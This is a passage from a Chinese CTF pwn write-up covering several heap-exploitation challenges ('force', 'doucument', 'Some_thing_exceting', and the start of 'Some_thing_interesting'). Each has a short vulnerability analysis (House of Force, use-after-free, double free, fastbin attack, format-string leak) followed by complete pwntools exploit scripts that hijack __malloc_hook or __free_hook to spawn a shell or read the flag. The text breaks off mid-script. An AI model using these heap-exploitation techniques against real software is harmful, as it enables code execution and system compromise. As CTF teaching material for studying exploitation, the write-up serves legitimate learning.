> chunk的head处，以用户申请大小所匹配的chunk大小为偏移量，将top chunk的位置推到新的位置，而原来的top chunk
> head处就作为新的堆块被分配给用户了：试想，如果我们能控制top
> chunk在这个过程中推到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将top
> chunk劫持到任意内存地址，然后就可以控制目标内存。
    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(malloc_hook_addr - heap_base - 0x50))
    sh.recvuntil('content')
    sh.sendline('Anyvalue')
那么我们接下来就可以顺利的劫持`__malloc_hook`了。
    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(0x10))
    sh.recvuntil('content')
    sh.sendline(p64(libc_base + libc.symbols['system']))
###  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    force=ELF('./force', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./force")
    def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address+offset)))
        return return_address+offset
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    if __name__ == "__main__":
        sh = get_sh()
        sh.recvuntil('2:puts')
        sh.sendline('1')
        sh.recvuntil('size')
        sh.sendline(str(0x100000))
        libc_base = get_address(sh,'We get libc base address is ','bin addr 0x','n',-0x4D2010,True)
        sh.sendline('Chunk0')
        sh.recvuntil('2:puts')
        sh.sendline('1')
        sh.recvuntil('size')
        sh.sendline(str(0x20))
        heap_base = get_address(sh,'We get heap base address is ','bin addr 0x','n',-0x10,True)
        sh.sendline(p64(0) * 5 + p64(0xFFFFFFFFFFFFFFFF))
        sh.recvuntil('2:puts')
        sh.sendline('1')
        sh.recvuntil('size')
        sh.sendline(str(libc_base + libc.symbols['__malloc_hook'] - heap_base - 0x50))
        sh.recvuntil('content')
        sh.sendline('Anyvalue')
        sh.recvuntil('2:puts')
        sh.sendline('1')
        sh.recvuntil('size')
        sh.sendline(str(0x10))
        sh.recvuntil('content')
        sh.sendline(p64(libc_base + libc.symbols['system']))
        sh.recvuntil('2:puts')
        sh.sendline('1')
        sh.recvuntil('size')
        sh.sendline(str(libc_base + libc.search('/bin/sh').next()))
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
## 0x04 FirstDay_doucument
###  题目信息
全保护都被开启了
###  漏洞分析
分析delete函数可以很明显的看出存在UAF和Double Free漏洞
那么当我们释放一个chunk后，再申请的大小为0x20的chunk事实上都会被存储在可写区域，那么可以直接篡改Note的note指针，使之指向`__free_hook`，然后将其改写为`system`即可完成攻击。
###  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    doucument=ELF('./doucument', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./doucument")
    def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address+offset)))
        return return_address+offset
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    def creat(sh,name,sex,information):
        sh.recvuntil('Give me your choice : ')
        sh.sendline('1')
        sh.recvuntil('input name')
        sh.send(name)
        sh.recvuntil('input sex')
        sh.send('W')
        sh.recvuntil('input information')
        sh.send(information)
    def show(sh,index):
        sh.recvuntil('Give me your choice : ')
        sh.sendline('2')
        sh.recvuntil('Give me your index : ')
        sh.sendline(str(index))
    def edit(sh,index,Change_sex,information):
        sh.recvuntil('Give me your choice : ')
        sh.sendline('3')
        sh.recvuntil('Give me your index : ')
        sh.sendline(str(index))
        sh.recvuntil('Are you sure change sex?')
        if Change_sex:
            sh.send('Y')
        else:
            sh.send('N')
        sh.recvuntil('Now change information')
        sh.send(information)
    def delete(sh,index):
        sh.recvuntil('Give me your choice : ')
        sh.sendline('4')
        sh.recvuntil('Give me your index : ')
        sh.sendline(str(index))
    if __name__ == "__main__":
        sh = get_sh()
        creat(sh,'/bin/shx00','W','/bin/shx00' * 14)
        creat(sh,'Chunk__1','W','A' * 0x70)
        creat(sh,'Chunk__2','W','B' * 0x70)
        delete(sh,1)
        show(sh,1)
        libc_base = get_address(sh,'We get libc address is ','x0A','x0A',-0x3C4B78)
        creat(sh,'Chunk__3','W','C' * 0x70)
        creat(sh,'Chunk__4','W','D' * 0x70)
        edit(sh,1,False,p64(0)+p64(0x21)+p64(libc_base + libc.symbols['__free_hook'] - 0x10) + p64(1) + p64(0) * 10)
        edit(sh,4,False,p64(libc_base + libc.symbols['system']) + p64(1) + p64(0) * 12)
        delete(sh,0)
        sh.interactive()
## 0x05 SecondDay_Some_thing_exceting
###  题目信息
可以发现程序除了PIE之外保护全部开启了。
###  漏洞分析
可以发现，程序在启动时就已经将flag读入了BSS段，并且在存储flag的内存区域上方已经预留了一个`x60`
接着可以很快发现在delete函数中，程序在删除`banana`时，free后未将指针置0。存在UAF以及UAF衍生出的`Double
free`漏洞。于是可以使用`fastbin attack`借助预留的`x60`将chunk直接分配过去，flag就会恰好在ba的位置，可以直接进行读取。
###  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elif context.arch == 'i386':
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./")
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./excited")
    def get_address(sh,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    def creat(sh,name_size,name_value,desc_size,desc_value):
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('1')
        sh.recvuntil('> ba's length : ')
        sh.sendline(str(name_size))
        sh.recvuntil('> ba : ')
        sh.sendline(name_value)
        sh.recvuntil('> na's length : ')
        sh.sendline(str(desc_size))
        sh.recvuntil('> na : ')
        sh.sendline(desc_value)
    def delete(sh,index):
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('3')
        sh.recvuntil('> Banana ID : ')
        sh.sendline(str(index))
    def show(sh,index):
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('4')
        sh.recvuntil('> Banana ID : ')
        sh.sendline(str(index))
    if __name__ == "__main__":
        sh = get_sh()
        creat(sh,0x50,'Chunk_1',0x50,'Chunk_2')
        creat(sh,0x50,'Chunk_3',0x50,'Chunk_4')
        delete(sh,0)
        delete(sh,1)
        delete(sh,0)
        creat(sh,0x50,p64(0x602098),0x50,'Chunk_2')
        creat(sh,0x50,'Chunk_3',0x50,'Chunk_4')
        creat(sh,0x50,'',0x30,'')
        show(sh,4)
        sh.interactive()
        sh.close()
## 0x06 SecondDay_Some_thing_interesting
###  题目信息
本题保护全开。
###  漏洞分析
本题的漏洞利用难度要高一些，可以发现题目中提供了`Check Code`功能。
分析后发现了一个格式化字符串漏洞用来泄露程序的PIE~
并且发现，delete函数处依旧存在UAF漏洞，那么可以利用`Fastbin Attack`劫持`Oreo
list`进而篡改`free_hook`来get_shell。
###  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    interested=ELF('./interested')
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elif context.arch == 'i386':
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./")
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./interested")
    def get_address(sh,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    def creat(sh,name_size,name_value,desc_size,desc_value):
        sh.recvuntil('> Now please tell me what you want to do :')
        sh.sendline('1')
        sh.recvuntil('> O's length : ')
        sh.sendline(str(name_size))
        sh.recvuntil('> O : ')